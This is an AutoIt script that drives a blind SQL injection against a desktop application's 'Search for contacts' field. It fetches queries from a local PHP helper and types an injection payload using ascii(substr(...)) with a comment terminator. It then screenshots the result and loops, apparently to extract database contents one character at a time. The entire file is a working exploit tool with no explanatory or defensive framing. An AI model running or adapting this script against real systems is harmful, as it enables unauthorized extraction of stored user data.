#include <ScreenCapture.au3>

Sleep(500)

$Delta = 10081
$Cache = 123
Do

	$oIE=ObjCreate("InternetExplorer.Application.1")

	if @error then
		$oIE=ObjCreate("InternetExplorer.Application.1")
	endif

	$oIE.Visible=1
	$oIE.RegisterAsDropTarget = 1
	$oIE.RegisterAsBrowser = 1


	$SinkObject=ObjEvent($oIE,"IEEvent_","DWebBrowserEvents")
	if @error then
		$SinkObject=ObjEvent($oIE,"IEEvent_","DWebBrowserEvents")
	endif

	Sleep(1000)
	$URL = "http://localhost/sql.php?cache=" & $Cache;
	$Cache = $Cache + 1
	$oIE.Navigate( $URL )
	Sleep(2000)

	WinActivate($SinkObject)
	WinSetState($SinkObject, '', @SW_SHOW)

	Sleep(200)
	Send("^a")
	Sleep(100)
	Send("^c")
	Sleep(200)
	$SinkObject=0 
	$oIE.Quit 
	$oIE=0

	$Query = "" & ClipGet() & ""

	$sTitle = 'Search for contacts'

	Opt("MouseCoordMode", 0)

	$hWin = WinWait($sTitle, '', 1)
	WinActivate($hWin)
	WinSetState($hWin, '', @SW_SHOW)
	Sleep(500)
	MouseClick("", 270, 83, 1)
	Sleep(500)
	Send("^a")
	Sleep(400)
	Send("{DEL}")
	Sleep(400)
	Send("aaaa")
	Sleep(1000)
	Send("{ENTER}")
	Send("^a")
	Sleep(400)
	Send("{DEL}")
	Send("aaaa"" or users.id=ascii(substr(("& $Query & ",1)){+} " & $Delta & " -- 2")
	Send("{ENTER}")
	Sleep(5000)
	 
	$aPos = WinGetPos("Search for contacts")
	_ScreenCapture_Capture("c:/wwwroot/htdocs/cmp.png",$aPos[0]+17,  $aPos[1]+133, $aPos[0]+334, $aPos[1]+173,0)
	Sleep(3000);
	 

	$oIE=ObjCreate("InternetExplorer.Application.1")

	if @error then
		$oIE=ObjCreate("InternetExplorer.Application.1")
	endif

	$oIE.Visible=1
	$oIE.RegisterAsDropTarget = 1
	$oIE.RegisterAsBrowser = 1


	$SinkObject=ObjEvent($oIE,"IEEvent_","DWebBrowserEvents")
	if @error then
		$SinkObject=ObjEvent($oIE,"IEEvent_","DWebBrowserEvents")
	endif

	sleep(1000)
	$URL = "http://localhost/sql.php?q=1&cache=" & $Cache
	$Cache = $Cache + 1
	$oIE.Navigate( $URL )
	sleep(1000)
	$SinkObject=0 
	$oIE.Quit 
	$oIE=0
Until ($Query == "),1")
